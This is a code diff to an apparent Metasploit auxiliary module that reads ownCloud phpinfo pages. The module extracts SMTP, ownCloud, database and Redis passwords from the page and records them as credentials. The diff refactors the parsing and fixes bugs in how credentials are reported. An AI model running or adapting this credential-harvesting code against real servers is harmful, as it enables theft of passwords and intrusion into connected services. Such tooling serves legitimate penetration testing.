@@ -63,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
       return ['', 'owncloud']
     end
 
-    datastore['ROOT']
+    [datastore['ROOT']]
   end
 
   def endfiles
@@ -73,11 +73,64 @@ class MetasploitModule < Msf::Auxiliary
         '.jpeg', '.json', '.properties', '.min.map', '.js.map', '.auto.map'
       ]
     end
-    ".#{datastore['ENDFILE']}"
+    [".#{datastore['ENDFILE']}"]
   end
 
-  def field_regex(field)
-    "<tr><td class=\"e\">#{field} <\/td><td class=\"v\">([^ ]+) <\/td><\/tr>"
+  def extract_values(res)
+    fields = get_mappings.invert
+    res.get_html_document.css('tr').each_with_object({}) do |row, values|
+      field_name = fields[row.at_css('td.e')&.text&.delete_suffix(' ')]
+      value_cell = row.at_css('td.v')
+      next unless field_name && value_cell
+      next if value_cell.at_css('i')&.text == 'no value'
+
+      # phpinfo adds one formatting space after the value. Preserve spaces in
+      # the actual secret and let the HTML parser decode entities exactly once.
+      value = value_cell.text.delete_suffix(' ')
+      values[field_name] = value unless value.empty?
+    end
+  end
+
+  def database_endpoint(host)
+    return {} unless host.is_a?(String) && !host.empty?
+
+    uri = URI.parse("//#{host}")
+    return {} unless uri.hostname && uri.userinfo.nil? && uri.path.empty? && uri.query.nil? && uri.fragment.nil?
+
+    { host: uri.hostname, port: uri.port }
+  rescue URI::InvalidURIError
+    {}
+  end
+
+  def report_extracted_credential(service_name:, password:, host: nil, port: nil, username: nil)
+    unless service_name && host.is_a?(String) && !host.empty? && port.to_s.match?(/\A\d+\z/) && (1..65_535).cover?(port.to_i)
+      vprint_warning("Unable to associate #{service_name || 'database'} credential with a service: missing or invalid host or port; see loot")
+      return
+    end
+
+    address = Rex::Socket.getaddress(host)
+    unless address.is_a?(String) && Rex::Socket.is_ip_addr?(address)
+      vprint_warning("Unable to associate #{service_name} credential with #{host}: no IP address was resolved; see loot")
+      return
+    end
+
+    report_service(host: address, port: port.to_i, proto: 'tcp', name: service_name)
+    create_credential(
+      protocol: 'tcp',
+      port: port.to_i,
+      address: address,
+      workspace_id: myworkspace_id,
+      service_name: service_name,
+      origin_type: :service,
+      module_fullname: fullname,
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      username: username || '',
+      private_data: password,
+      private_type: :password
+    )
+  rescue SocketError => e
+    vprint_warning("Unable to associate #{service_name} credential with #{host}: name could not be resolved; see loot")
+    elog("Failed to resolve #{service_name} host #{host} for credential reporting", error: e)
   end
 
   def get_mappings
@@ -124,7 +177,7 @@ class MetasploitModule < Msf::Auxiliary
         )
 
         fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
-        unless res.code == 200 && res.body.include?('phpinfo()')
+        unless res.code == 200 && res.body&.include?('phpinfo()')
           print_bad("Not Exploited - HTTP Status Code: #{res.code}")
           next
         end
@@ -141,14 +194,8 @@ class MetasploitModule < Msf::Auxiliary
         print_good("Loot stored to: #{l}")
 
         # process the page
-        mappings = get_mappings
-        extracted_values = {}
-        mappings.each do |field_name, field|
-          if res.body =~ /#{field_regex(field)}/
-            extracted_values[field_name] = ::Regexp.last_match(1)
-            print_good("#{field_name}: #{extracted_values[field_name]}")
-          end
-        end
+        extracted_values = extract_values(res)
+        extracted_values.each { |field_name, value| print_good("#{field_name}: #{value}") }
 
         table = Rex::Text::Table.new(
           'Header' => 'Credentials',
@@ -158,79 +205,33 @@ class MetasploitModule < Msf::Auxiliary
         )
 
         if extracted_values['SMTP Password']
-          credential_data = {
-            protocol: 'tcp',
-            workspace_id: myworkspace_id,
-            service_name: 'SMTP',
-            origin_type: :service,
-            module_fullname: fullname,
-            status: Metasploit::Model::Login::Status::UNTRIED,
-            private_data: extracted_values['SMTP Password'],
-            private_type: :password
-          }
-          credential_data[:username] = extracted_values['SMTP Username'] if extracted_values['SMTP Username']
-          credential_data[:address] = extracted_values['SMTP Host'].nil? ? '127.0.0.1' : extracted_values['SMTP Host']
-          credential_data[:port] = extracted_values['SMTP Port'].nil? ? 25 : extracted_values['SMTP Port']
-
-          create_credential(credential_data)
-          table << ['SMTP', "#{credential_data[:address]}:#{credential_data[:port]}", credential_data[:username], extracted_values['SMTP Password'], '']
+          host = extracted_values['SMTP Host'] || '127.0.0.1'
+          port = extracted_values['SMTP Port'] || 25
+          username = extracted_values['SMTP Username']
+          report_extracted_credential(service_name: 'SMTP', host: host, port: port, username: username, password: extracted_values['SMTP Password'])
+          table << ['SMTP', host ? Rex::Socket.to_authority(host, port) : '', username, extracted_values['SMTP Password'], '']
         end
 
         if extracted_values['ownCloud Password']
-          credential_data = {
-            protocol: 'tcp',
-            port: rport,
-            address: rhost,
-            workspace_id: myworkspace_id,
-            service_name: 'ownCloud',
-            origin_type: :service,
-            module_fullname: fullname,
-            status: Metasploit::Model::Login::Status::UNTRIED,
-            private_data: extracted_values['ownCloud Password'],
-            private_type: :password
-          }
-          credential_data[:username] = extracted_values['ownCloud Username'].nil? ? '' : extracted_values['ownCloud Username']
-
-          create_credential(credential_data)
-          table << ['ownCloud', "#{rhost}:#{rport}", credential_data[:username], extracted_values['ownCloud Password'], '']
+          username = extracted_values['ownCloud Username']
+          report_extracted_credential(service_name: 'ownCloud', host: rhost, port: rport, username: username, password: extracted_values['ownCloud Password'])
+          table << ['ownCloud', Rex::Socket.to_authority(rhost, rport), username, extracted_values['ownCloud Password'], '']
         end
 
         ## DB
         if extracted_values['DB Password']
-          credential_data = {
-            protocol: 'tcp',
-            port: extracted_values['DB Host'].split(':')[1],
-            address: extracted_values['DB Host'].split(':')[0],
-            workspace_id: myworkspace_id,
-            service_name: extracted_values['DB Type'],
-            origin_type: :service,
-            module_fullname: fullname,
-            status: Metasploit::Model::Login::Status::UNTRIED,
-            private_data: datastore['DB Password'],
-            private_type: :password
-          }
-          credential_data[:username] = extracted_values['DB Password'].nil? ? '' : extracted_values['DB Username']
-          create_credential(credential_data)
-          table << [extracted_values['DB Type'], "#{rhost}:#{rport}", credential_data[:username], extracted_values['DB Password'], '']
+          endpoint = database_endpoint(extracted_values['DB Host'])
+          username = extracted_values['DB Username']
+          report_extracted_credential(service_name: extracted_values['DB Type'], **endpoint, username: username, password: extracted_values['DB Password'])
+          table << [extracted_values['DB Type'], extracted_values['DB Host'], username, extracted_values['DB Password'], '']
         end
 
         ## REDIS
         if extracted_values['Redis Password']
-          credential_data = {
-            protocol: 'tcp',
-            port: extracted_values['Redis Host'],
-            address: extracted_values['Redis Port'],
-            workspace_id: myworkspace_id,
-            service_name: 'redis',
-            origin_type: :service,
-            module_fullname: fullname,
-            status: Metasploit::Model::Login::Status::UNTRIED,
-            private_data: extracted_values['Redis Password'],
-            private_type: :password
-          }
-
-          create_credential(credential_data)
-          table << ['redis', "#{extracted_values['Redis Host']}:#{extracted_values['Redis Port']}", '', extracted_values['Redis Password'], '']
+          host = extracted_values['Redis Host']
+          port = extracted_values['Redis Port']
+          report_extracted_credential(service_name: 'redis', host: host, port: port, password: extracted_values['Redis Password'])
+          table << ['redis', host ? Rex::Socket.to_authority(host, port) : '', '', extracted_values['Redis Password'], '']
         end
 
         ## OBJECTSTORE
